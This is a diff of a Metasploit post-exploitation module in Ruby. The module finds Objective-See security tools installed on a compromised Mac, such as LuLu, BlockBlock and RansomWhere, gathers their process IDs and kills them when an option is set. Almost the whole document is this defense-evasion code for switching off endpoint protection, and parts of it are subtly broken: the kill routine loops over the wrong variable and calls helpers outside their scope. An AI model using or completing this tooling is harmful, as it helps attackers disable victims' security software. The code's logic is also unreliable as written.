@@ -42,57 +42,60 @@ class MetasploitModule < Msf::Post
   # Holds information on an objective see product. i.e name, installation status and location on filesystem.
   class ObjectiveSee
 
-    attr_accessor :name, :path
+    attr_accessor :name, :path, :pids
 
-    # is cattr_accessor only in rails?
     cattr_accessor :installed_products
-    cattr_accessor :pids
 
     @@installed_products = []
 
-    def initialize(name, msf)
-
-      # so we can use the Metasploit API to interact with the session object
+    # We pass in an instance of MetasploitModule in order to access Metasploit API methods via send
+    # Rather than retrieving processes every time we create a new instance of ObjectiveSee we'll do it once and
+    # pass that data in order to retireve the pid(s) associated w each product
+    def initialize(name, msf, processes)
       @msf = msf
-      @name = name 
-      p (name)
-      # writing name this way is prettier and makes it easier to grab pid's of running processes
-      # no idea why this code is not running
-      # @name = name.delete_suffix!("Helper").delete_suffix!(".app")
+      @path = "/Applications/#{name}.app"
+      @name = name
+      @pids = []
 
-      @path = "/Applications/#{name}"
-      @installed = installed?
+      if installed?
+        # ObjectiveSee.installed_products => [<ObjectiveSee>,<ObjectiveSee>]
+        @@installed_products << self
 
-      # @@present is a class variable which stores all of products installed on the system
-      # ObjectiveSee.installed_products => [<ObjectiveSee>,<ObjectiveSee>]
-      @@installed_products << self if installed?
+        # get_processes returns an array pf hashes, composed of the name of the program and the pid
+        # ex. [{"name"=>"configd", "pid"=>116}, {"name"=>"logd", "pid"=>104},..
+
+        processes.each { |elem| @pids << elem['pid'] if elem['name'].include? @name.split(' ')[0] }
+      end
     end
 
     def installed?
-      @installed = @msf.send :directory?, @path
+      @msf.send :directory?, @path
     end
 
-    # Needs to be refactored.
-    def pid
-      @pid = @msf.send :pidof, @name
-    end
-
-    def running?
-      true unless @pid.nil?
-    end
+    def kill_pids
+      @processes.each do |id|
+        print_status "Trying to kill process #{id} for #{@name}..."
+        result = kill_process id
+        print_status result 
+      end 
+    end 
   end
 
   # Determine which products are installed and their ppid if any
-  # Two BlockBlock processes are running BlockBlock Helper.app and BlockBlock.app
   def enumerate
-    products = ['LuLu.app', 'BlockBlock Helper.app', 'Do Not Disturb.app',
-    'ReiKey.app', 'RansomWhere.app', 'OverSight.app'].map do |prod|
-    ObjectiveSee.new prod, self
+    [
+      'LuLu', 'BlockBlock Helper', 'Do Not Disturb',
+      'ReiKey', 'RansomWhere', 'OverSight'
+    ].map do |prod|
+      ObjectiveSee.new prod, self, @processes
     end
   end
 
   def run
-    print_status('Enumerating Objective See security products.')
+    print_status('Retrieving process list...')
+    @processes = get_processes
+
+    print_status('Enumerating Objective See security products...')
     enumerate
 
     if ObjectiveSee.installed_products.empty?
@@ -100,30 +103,13 @@ class MetasploitModule < Msf::Post
                 'No Objective Cee products were found to be installed on the system.')
     else
       print_good('The following Objective See products were found installed on the system:')
-      ObjectiveSee.installed_products.each { |prod| print_status(prod.name)}
+      ObjectiveSee.installed_products.each { |prod| print_status("Found #{prod.name} with pids of #{prod.pids.inspect}") }
     end
 
-    x = ObjectiveSee.installed_products.map {|p| p.name}
-
-    print_status x
-
-  # get_processes returns an array pf hashes, composed of the name of the program and the pid
-  # ex. [{"name"=>"configd", "pid"=>116},
-  # {"name"=>"logd", "pid"=>104},
-  # {"name"=>"UserEventAgent", "pid"=>106},
-  # {"name"=>"launchd", "pid"=>1}]
-
-   # get_processes.select do |elem|
-   #   elem['name'].include? 'BlockBlock'
-   # end 
-
-   # grep for installed products names
-
+    # TODO: look into report_note post/windows/gather/enum_av uses these to log antivirus installation on the system
 
     return if datastore['ENUMERATE_ONLY']
 
-    # ObjectiveSee.installed_products.each {|prod| &:kill_pid} if datastore['KILL_PROCESSES']
-
-    # uninstall if datastore['']
+    ObjectiveSee.installed_products.each {|product| product.kill_pids} if datastore['KILL_PROCESSES']
   end
 end
